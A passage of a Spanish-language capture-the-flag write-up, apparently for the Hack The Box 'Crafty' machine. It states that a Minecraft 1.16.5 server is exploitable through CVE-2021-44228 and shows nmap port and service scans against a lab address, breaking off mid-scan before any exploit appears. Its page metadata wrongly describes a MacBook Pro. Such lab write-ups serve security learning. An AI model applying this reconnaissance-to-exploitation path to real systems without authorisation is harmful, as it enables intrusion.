<!DOCTYPE html><html lang="en" class="scroll-smooth" data-astro-cid-37fxchfa> <head><!-- Global Metadata --><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><meta name="generator" content="Astro v4.0.8"><!-- Canonical URL --><link rel="canonical" href="https://blog-template-gray.vercel.app/post/crafty/"><!-- Primary Meta Tags --><title>Crafty - HTB Writeup • Full Blog</title><!-- ViewTransitions  --><meta name="astro-view-transitions-enabled" content="true"><meta name="astro-view-transitions-fallback" content="animate"><!-- SEO --><meta name="title" content="Crafty - HTB Writeup • Full Blog"><meta name="description" content="The new MacBook Pro 2022 is here. With the Apple M2 chip, a new design, and more, the new MacBook Pro is the best laptop Apple has ever made."><meta name="author" content="Fullaw4ke"><!-- Open Graph / Facebook --><meta property="og:type" content="article"><meta property="og:url" content="https://blog-template-gray.vercel.app/post/crafty/"><meta property="og:title" content="Crafty - HTB Writeup"><meta property="og:description" content="The new MacBook Pro 2022 is here. With the Apple M2 chip, a new design, and more, the new MacBook Pro is the best laptop Apple has ever made."><meta property="og:image" content="https://blog-template-gray.vercel.app/_astro/image.R-ZwdRw5.png"><meta property="article:author" content="Fullaw4ke"><meta property="article:published_time" content="2022-07-02T04:00:00.000Z"><!-- Twitter --><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://blog-template-gray.vercel.app/post/crafty/"><meta property="twitter:title" content="Crafty - HTB Writeup"><meta property="twitter:description" content="The new MacBook Pro 2022 is here. With the Apple M2 chip, a new design, and more, the new MacBook Pro is the best laptop Apple has ever made."><meta property="twitter:image" content="https://blog-template-gray.vercel.app/_astro/image.R-ZwdRw5.png"><!-- RSS auto-discovery --><link rel="alternate" type="application/rss+xml" title="Full Blog" href="/rss.xml"><link as="font" crossorigin rel="preload" href="/fonts/Manrope-Bold.woff2" type="font/woff2"><style>@font-face {font-weight: 200;font-style: normal;font-family: Manrope;font-display: swap;src: url(/fonts/Manrope-ExtraLight.woff2)}</style><style>@font-face {font-weight: 300;font-style: normal;font-family: Manrope;font-display: swap;src: url(/fonts/Manrope-Light.woff2)}</style><style>@font-face {font-weight: 400;font-style: normal;font-family: Manrope;font-display: swap;src: url(/fonts/Manrope-Regular.woff2)}</style><style>@font-face {font-weight: 500;font-style: normal;font-family: Manrope;font-display: swap;src: url(/fonts/Manrope-Medium.woff2)}</style><style>@font-face {font-weight: 600;font-style: normal;font-family: Manrope;font-display: swap;src: url(/fonts/Manrope-SemiBold.woff2)}</style><style>@font-face {font-weight: 700;font-style: normal;font-family: Manrope;font-display: swap;src: url(/fonts/Manrope-Bold.woff2)}</style><style>@font-face {font-weight: 800;font-style: normal;font-family: Manrope;font-display: swap;src: url(/fonts/Manrope-ExtraBold.woff2)}</style><style>@font-face { font-family: _font_fallback_1728617366745; size-adjust: 103.76%; src: local('Arial'); ascent-override: 102.74%; descent-override: 28.91%; line-gap-override: 0.00%; }</style><script>
	function getTheme() {
		const storedTheme = typeof localStorage !== 'undefined' && localStorage.getItem('theme')

		return (
			storedTheme || (window.matchMedia('(prefers-color-scheme: light)').matches ? 'light' : 'dark')
		)
	}

	function setTheme(newTheme) {
		const html = document.documentElement
		const isDark = newTheme === 'dark'

		html.classList.toggle('dark', isDark)
		html.classList.toggle('light', !isDark)

		localStorage.setItem('theme', newTheme)
	}

	// set initial theme
	setTheme(getTheme())
	document.addEventListener('astro:after-swap', () => setTheme(getTheme()))

	document.addEventListener('theme-change', (e) => {
		setTheme(e.detail.theme)
	})
</script><script>
	if (!('animations' in localStorage)) {
		localStorage.setItem('animations', 'true')
	} else {
		localStorage.setItem('animations', 'false')
	}
</script><link rel="stylesheet" href="/_astro/_page_.oLAkEadO.css" />
<link rel="stylesheet" href="/_astro/_slug_.m5WJ7WE5.css" /><script type="module" src="/_astro/hoisted.cZ5bdfWX.js"></script></head> <body class="bg-white text-stone-950 dark:bg-[#0a0910] dark:text-white" data-astro-cid-37fxchfa> <main class="px-5 sm:mx-auto sm:max-w-2xl sm:px-8 lg:px-0 antialiased md:max-w-6xl grid gap-12 mt-4 overflow-hidden md:overflow-visible" data-astro-cid-37fxchfa> <header class="relative flex items-center h-12 font-semibold"> <a class="text-lg mr-auto" href="/">Home</a> <div id="astro-header-drawer" class="shadow rounded-l-lg md:bg-transparent dark:md:bg-transparent bg-white dark:bg-[#0a0910] md:shadow-none md:rounded-none md:border-none md:h-auto md:static absolute transition-transform duration-300 ease-in translate-x-96 md:translate-x-0 top-12 -right-5 pl-4 pt-6 pb-4 md:p-0 h-[200px] w-[200px] z-50"> <nav class="flex h-full flex-col justify-between gap-12 text-left md:flex-row md:w-full md:gap-5"> <div class="flex flex-col gap-4 md:flex-row md:border-r-2 border-black pr-4 dark:border-white"> <a href="/tags" class="text-opacity-60 flex items-center gap-1 text-2xl md:text-base" rel="noopener noreferrer ">  <svg xmlns="http://www.w3.org/2000/svg" class="w-8 md:w-6" viewBox="0 0 24 24" stroke-width="1.25" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M7.859 6h-2.834a2.025 2.025 0 0 0 -2.025 2.025v2.834c0 .537 .213 1.052 .593 1.432l6.116 6.116a2.025 2.025 0 0 0 2.864 0l2.834 -2.834a2.025 2.025 0 0 0 0 -2.864l-6.117 -6.116a2.025 2.025 0 0 0 -1.431 -.593z"></path> <path d="M17.573 18.407l2.834 -2.834a2.025 2.025 0 0 0 0 -2.864l-7.117 -7.116"></path> <path d="M6 9h-.01"></path> </svg> Tags
 </a> </div> <div class="flex justify-center items-center md:justify-end gap-3 md:p-0"> <a href="https://github.com/fullaw4ke" class="text-opacity-60" rel="noopener noreferrer " target="_blank" aria-label="Github">  <span><svg xmlns="http://www.w3.org/2000/svg" class="w-8 md:w-6" viewBox="0 0 24 24" stroke-width="1.3" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5"></path> </svg> </span>  </a><a href="https://x.com/fullaw4ke" class="text-opacity-60" rel="noopener noreferrer " target="_blank" aria-label="Twitter">  <span><svg xmlns="http://www.w3.org/2000/svg" class="w-8 md:w-6" viewBox="0 0 24 24" stroke-width="1.3" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c0 -.249 1.51 -2.772 1.818 -4.013z"></path> </svg> </span>  </a> </div> </nav> </div> <div class="flex items-center gap-3 md:pl-3" data-astro-transition-persist="navbar"> <div> <site-search id="search" class="ms-auto"> <button data-open-modal disabled class="flex items-center justify-center rounded-md gap-1"> <svg aria-label="search" class="h-6 w-6" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5"> <path stroke="none" d="M0 0h24v24H0z"></path> <path d="M3 10a7 7 0 1 0 14 0 7 7 0 1 0-14 0M21 21l-6-6"></path> </svg> <!-- <span class='md:hidden text-2xl'> Search</span> --> </button> <dialog aria-label="search" class="h-full max-h-full w-full max-w-full border border-zinc-400 bg-white dark:bg-[#0a0910ec] shadow backdrop:backdrop-blur sm:mx-auto sm:mb-auto sm:mt-16 sm:h-max sm:max-h-[calc(100%-8rem)] sm:min-h-[15rem] sm:w-5/6 sm:max-w-[48rem] sm:rounded-md opacity-0"> <div class="dialog-frame flex flex-col gap-4 p-6 pt-12 sm:pt-6"> <button data-close-modal class="ms-auto cursor-pointer rounded-full bg-black text-white px-4 py-2 dark:bg-white dark:text-black">Close</button> <div class="search-container dark:text-white"> <div id="pagefind__search"></div> </div> </div> </dialog> </site-search>   </div>  <theme-toggle class="relative h-6 w-6"> <button id="toggle-theme" class="group" aria-label="Toggle Theme"> <span class="absolute left-0 right-0 top-0 opacity-0 group-aria-pressed:opacity-100"> <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-sun-high" width="24" height="24" viewBox="0 0 24 24" stroke-width="1" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M14.828 14.828a4 4 0 1 0 -5.656 -5.656a4 4 0 0 0 5.656 5.656z"></path> <path d="M6.343 17.657l-1.414 1.414"></path> <path d="M6.343 6.343l-1.414 -1.414"></path> <path d="M17.657 6.343l1.414 -1.414"></path> <path d="M17.657 17.657l1.414 1.414"></path> <path d="M4 12h-2"></path> <path d="M12 4v-2"></path> <path d="M20 12h2"></path> <path d="M12 20v2"></path> </svg> </span> <span class="absolute left-0 right-0 top-0 opacity-0 group-aria-[pressed=false]:opacity-100"> <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-moon" width="24" height="24" viewBox="0 0 24 24" stroke-width="1.25" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z"></path> </svg> </span> </button> </theme-toggle> <script>
	const button = document.getElementById('toggle-theme')

	function setButtonPresssed() {
		const bodyThemeIsDark = document.documentElement.classList.contains('dark')
		button.setAttribute('aria-pressed', String(bodyThemeIsDark))
	}
	setButtonPresssed()
</script> <button id="astro-header-drawer-button" type="button" class="md:ml-6 md:hidden"> <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-menu-2" width="24" height="24" viewBox="0 0 24 24" stroke-width="1.25" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M4 6l16 0"></path> <path d="M4 12l16 0"></path> <path d="M4 18l16 0"></path> </svg> <span class="sr-only">Show Menu</span> </button> </div> </header>   <article class="min-w-full md:py-4 sm:max-w-none md:max-w-none"> <header class="mb-3 flex flex-col justify-center items-center gap-6"> <div class="flex flex-col gap-2"> <div class="flex items-center justify-center gap-x-1"> <p class="text-center text-sm text-opacity-50">
Published <time class="text-sm font-bold text-opacity-60" datetime="2022-07-02T04:00:00.000Z"> Jul 2, 2022 </time> </p> <p class="text-center text-sm text-opacity-50 font-bold">
- 9 min read </p> </div> <h1 class="text-center text-4xl md:text-6xl md:pb-2.5 font-semibold"> Crafty - HTB Writeup </h1> </div> <div class="flex flex-wrap justify-center items-center gap-2 gap-y-4 md:gap-5"> <a href="/tags/easy" aria-label="Easy"> <span class="bg-indigo-600 font-semibold text-white dark:bg-indigo-900 dark:text-white shadow text-sm w-fit px-2 py-1 md:px-5 md:py-2 rounded-full"> Easy </span> </a> </div> </header> <img src="/_astro/image.R-ZwdRw5_Z1r1Iar.jpg" loading="eager" class="rounded-md w-full max-h-[300px]  md:max-h-[500px] my-8 object-cover" alt="img of Crafty - HTB Writeup" width="1000" height="500" decoding="async"> <hr> <div>  <div class="grid grid-cols-1 md:grid-cols-[20%_auto] gap-10 mt-8"> <!-- aside  --> <aside class="md:flex flex-col gap-8 hidden"> <div class="flex flex-col gap-2"> <span class="mb-1 font-bold text-2xl">Share</span> <ul class="flex gap-3 text-black dark:text-white"> <li> <a href="https://twitter.com/intent/tweet?text=Share this post https://blog-template-gray.vercel.app/post/crafty/" aria-label="Share on Twitter"><!--?xml version="1.0" ?--><svg height="32px" style="fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:2;" version="1.1" viewBox="0 0 512 512" width="32px" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><g><path d="M448,512l-384,0c-35.328,0 -64,-28.672 -64,-64l0,-384c0,-35.328 28.672,-64 64,-64l384,0c35.328,0 64,28.672 64,64l0,384c0,35.328 -28.672,64 -64,64Z" id="Dark_Blue" style="fill:#1da1f2;fill-rule:nonzero;"></path><path d="M196.608,386.048c120.704,0 186.752,-100.096 186.752,-186.752c0,-2.816 0,-5.632 -0.128,-8.448c12.8,-9.216 23.936,-20.864 32.768,-34.048c-11.776,5.248 -24.448,8.704 -37.76,10.368c13.568,-8.064 23.936,-20.992 28.928,-36.352c-12.672,7.552 -26.752,12.928 -41.728,15.872c-12.032,-12.8 -29.056,-20.736 -47.872,-20.736c-36.224,0 -65.664,29.44 -65.664,65.664c0,5.12 0.64,10.112 1.664,14.976c-54.528,-2.688 -102.912,-28.928 -135.296,-68.608c-5.632,9.728 -8.832,20.992 -8.832,33.024c0,22.784 11.648,42.88 29.184,54.656c-10.752,-0.384 -20.864,-3.328 -29.696,-8.192l0,0.896c0,31.744 22.656,58.368 52.608,64.384c-5.504,1.536 -11.264,2.304 -17.28,2.304c-4.224,0 -8.32,-0.384 -12.288,-1.152c8.32,26.112 32.64,45.056 61.312,45.568c-22.528,17.664 -50.816,28.16 -81.536,28.16c-5.248,0 -10.496,-0.256 -15.616,-0.896c28.928,18.432 63.488,29.312 100.48,29.312" id="Logo__x2014__FIXED" style="fill:#fff;fill-rule:nonzero;"></path></g></svg></a> </li> <li> <a href="https://www.linkedin.com/shareArticle?mini=true&#38;url=https://blog-template-gray.vercel.app/post/crafty/" aria-label="Share on LinkedIn"> <svg enable-background="new 0 0 32 32" height="32px" id="Layer_1" version="1.0" viewBox="0 0 32 32" width="32px" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><g><path d="M32,30c0,1.104-0.896,2-2,2H2c-1.104,0-2-0.896-2-2V2c0-1.104,0.896-2,2-2h28c1.104,0,2,0.896,2,2V30z" fill="#007BB5"></path><g><rect fill="#FFFFFF" height="14" width="4" x="7" y="11"></rect><path d="M20.499,11c-2.791,0-3.271,1.018-3.499,2v-2h-4v14h4v-8c0-1.297,0.703-2,2-2c1.266,0,2,0.688,2,2v8h4v-7    C25,14,24.479,11,20.499,11z" fill="#FFFFFF"></path><circle cx="9" cy="8" fill="#FFFFFF" r="2"></circle></g></g><g></g><g></g><g></g><g></g><g></g><g></g></svg></a> </li> </ul> </div> <div class="sticky top-24 self-start hidden md:block transition-all duration-200"> <nav class="max-w-xs dark:text-black"> <p class="font-bold mb-3 text-2xl dark:text-white">Index</p> <ul class="[text-wrap:balance] flex flex-col gap-1"> <li class="flex flex-col"> <a href="#enumeration" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> Enumeration </a>  </li><li class="flex flex-col"> <a href="#port-25565---minecraft-1165" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> Port 25565 - Minecraft 1.16.5 </a>  </li><li class="flex flex-col"> <a href="#privilege-escalation" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> Privilege escalation </a>  </li> </ul> </nav> </div> </aside> <!-- post --> <article class="max-w-full w-full"> <div class="prose prose-lg md:prose-xl dark:prose-invert mb-12 min-w-full"> <p>En esta máquina encontraremos un servidor de Minecraft 1.16.5 vulnerable al conocido CVE-2021-44228, tras abusar de él para obtener la ejecución de comandos en la máquina.</p>
<p>Information Gathering</p>
<p>Escaneado de todos los puertos TCP:</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#AB5959;--shiki-dark:#89DDFF">&gt;</span><span style="color:#393A34;--shiki-dark:#BABED8"> nmap -sS -Pn -n -p- --open -vvv --min-rate 200 10.10.11.249 </span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Nmap</span><span style="color:#B56959;--shiki-dark:#C3E88D"> scan</span><span style="color:#B56959;--shiki-dark:#C3E88D"> report</span><span style="color:#B56959;--shiki-dark:#C3E88D"> for</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 10.10</span><span style="color:#B56959;--shiki-dark:#C3E88D">.11.249</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Host</span><span style="color:#B56959;--shiki-dark:#C3E88D"> is</span><span style="color:#B56959;--shiki-dark:#C3E88D"> up,</span><span style="color:#B56959;--shiki-dark:#C3E88D"> received</span><span style="color:#B56959;--shiki-dark:#C3E88D"> user-set</span><span style="color:#393A34;--shiki-dark:#BABED8"> (0.37s </span><span style="color:#B56959;--shiki-dark:#C3E88D">latency</span><span style="color:#393A34;--shiki-dark:#BABED8">).</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Scanned</span><span style="color:#B56959;--shiki-dark:#C3E88D"> at</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 2024</span><span style="color:#B56959;--shiki-dark:#C3E88D">-06-17</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 10</span><span style="color:#B56959;--shiki-dark:#C3E88D">:07:01</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -04</span><span style="color:#B56959;--shiki-dark:#C3E88D"> for</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 660</span><span style="color:#B56959;--shiki-dark:#C3E88D">s</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Not</span><span style="color:#B56959;--shiki-dark:#C3E88D"> shown:</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 65533</span><span style="color:#B56959;--shiki-dark:#C3E88D"> filtered</span><span style="color:#B56959;--shiki-dark:#C3E88D"> tcp</span><span style="color:#B56959;--shiki-dark:#C3E88D"> ports</span><span style="color:#393A34;--shiki-dark:#BABED8"> (no-response)</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Some</span><span style="color:#B56959;--shiki-dark:#C3E88D"> closed</span><span style="color:#B56959;--shiki-dark:#C3E88D"> ports</span><span style="color:#B56959;--shiki-dark:#C3E88D"> may</span><span style="color:#B56959;--shiki-dark:#C3E88D"> be</span><span style="color:#B56959;--shiki-dark:#C3E88D"> reported</span><span style="color:#B56959;--shiki-dark:#C3E88D"> as</span><span style="color:#B56959;--shiki-dark:#C3E88D"> filtered</span><span style="color:#B56959;--shiki-dark:#C3E88D"> due</span><span style="color:#B56959;--shiki-dark:#C3E88D"> to</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> --defeat-rst-ratelimit</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">PORT</span><span style="color:#B56959;--shiki-dark:#C3E88D">      STATE</span><span style="color:#B56959;--shiki-dark:#C3E88D"> SERVICE</span><span style="color:#B56959;--shiki-dark:#C3E88D">   REASON</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">80/tcp</span><span style="color:#B56959;--shiki-dark:#C3E88D">    open</span><span style="color:#B56959;--shiki-dark:#C3E88D">  http</span><span style="color:#B56959;--shiki-dark:#C3E88D">      syn-ack</span><span style="color:#B56959;--shiki-dark:#C3E88D"> ttl</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 127</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">25565/tcp</span><span style="color:#B56959;--shiki-dark:#C3E88D"> open</span><span style="color:#B56959;--shiki-dark:#C3E88D">  minecraft</span><span style="color:#B56959;--shiki-dark:#C3E88D"> syn-ack</span><span style="color:#B56959;--shiki-dark:#C3E88D"> ttl</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 127</span></span>
<span class="line"></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Read</span><span style="color:#B56959;--shiki-dark:#C3E88D"> data</span><span style="color:#B56959;--shiki-dark:#C3E88D"> files</span><span style="color:#B56959;--shiki-dark:#C3E88D"> from:</span><span style="color:#B56959;--shiki-dark:#C3E88D"> /usr/bin/../share/nmap</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Nmap</span><span style="color:#B56959;--shiki-dark:#C3E88D"> done:</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 1</span><span style="color:#B56959;--shiki-dark:#C3E88D"> IP</span><span style="color:#B56959;--shiki-dark:#C3E88D"> address</span><span style="color:#393A34;--shiki-dark:#BABED8"> (1 </span><span style="color:#B56959;--shiki-dark:#C3E88D">host</span><span style="color:#B56959;--shiki-dark:#C3E88D"> up</span><span style="color:#393A34;--shiki-dark:#BABED8">) scanned </span><span style="color:#1E754F;--shiki-dark:#89DDFF;font-style:inherit;--shiki-dark-font-style:italic">in</span><span style="color:#393A34;--shiki-dark:#BABED8"> 660.40 seconds</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">           Raw</span><span style="color:#B56959;--shiki-dark:#C3E88D"> packets</span><span style="color:#B56959;--shiki-dark:#C3E88D"> sent:</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 131533</span><span style="color:#393A34;--shiki-dark:#BABED8"> (5.787MB) </span><span style="color:#AB5959;--shiki-dark:#89DDFF">|</span><span style="color:#59873A;--shiki-dark:#FFCB6B"> Rcvd:</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 791</span><span style="color:#393A34;--shiki-dark:#BABED8"> (130.048KB)</span></span></code></pre> 
<p>El sitio web nos redirige al dominio crafty.htbs que añadiremos a nuestro /etc/hosts:</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#998418;--shiki-dark:#82AAFF">...</span><span style="color:#393A34;--shiki-dark:#BABED8"> [snip]</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">10.10.11.249</span><span style="color:#B56959;--shiki-dark:#C3E88D"> crafty.htb</span></span></code></pre> 
<p>Al verlo, nos daremos cuenta de que es un portal a un servidor de Minecraft llamado «Crafty».</p>
<p><img src="/src/assets/images/writeups/crafty/image-1.png" alt="alt text"/></p>
<p>Por lo demás no parece que haya cosas más interesantes por aquí, porque los tres botones que se muestran no envían a nada interesante.</p>
<h1 id="enumeration">Enumeration</h1>
<h2 id="port-25565---minecraft-1165">Port 25565 - Minecraft 1.16.5</h2>
<p>Haciendo un escaneo de servicios al puerto 25565 podemos ver de que servidor se trata (Recordemos que no solo existe el servidor de Minecraft de Mojang, también existen Paper, BungeeCord, Spigot.. etc)</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#AB5959;--shiki-dark:#89DDFF">&gt;</span><span style="color:#393A34;--shiki-dark:#BABED8"> nmap -sCV -Pn -n -p 25565 -oN service -vvv --min-rate 200 10.10.11.249</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Nmap</span><span style="color:#B56959;--shiki-dark:#C3E88D"> scan</span><span style="color:#B56959;--shiki-dark:#C3E88D"> report</span><span style="color:#B56959;--shiki-dark:#C3E88D"> for</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 10.10</span><span style="color:#B56959;--shiki-dark:#C3E88D">.11.249</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Host</span><span style="color:#B56959;--shiki-dark:#C3E88D"> is</span><span style="color:#B56959;--shiki-dark:#C3E88D"> up,</span><span style="color:#B56959;--shiki-dark:#C3E88D"> received</span><span style="color:#B56959;--shiki-dark:#C3E88D"> user-set</span><span style="color:#393A34;--shiki-dark:#BABED8"> (0.23s </span><span style="color:#B56959;--shiki-dark:#C3E88D">latency</span><span style="color:#393A34;--shiki-dark:#BABED8">).</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Scanned</span><span style="color:#B56959;--shiki-dark:#C3E88D"> at</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 2024</span><span style="color:#B56959;--shiki-dark:#C3E88D">-06-17</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 10</span><span style="color:#B56959;--shiki-dark:#C3E88D">:23:28</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -04</span><span style="color:#B56959;--shiki-dark:#C3E88D"> for</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 12</span><span style="color:#B56959;--shiki-dark:#C3E88D">s</span></span>
<span class="line"></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">PORT</span><span style="color:#B56959;--shiki-dark:#C3E88D">      STATE</span><span style="color:#B56959;--shiki-dark:#C3E88D"> SERVICE</span><span style="color:#B56959;--shiki-dark:#C3E88D">   REASON</span><span style="color:#B56959;--shiki-dark:#C3E88D">          VERSION</span></span>
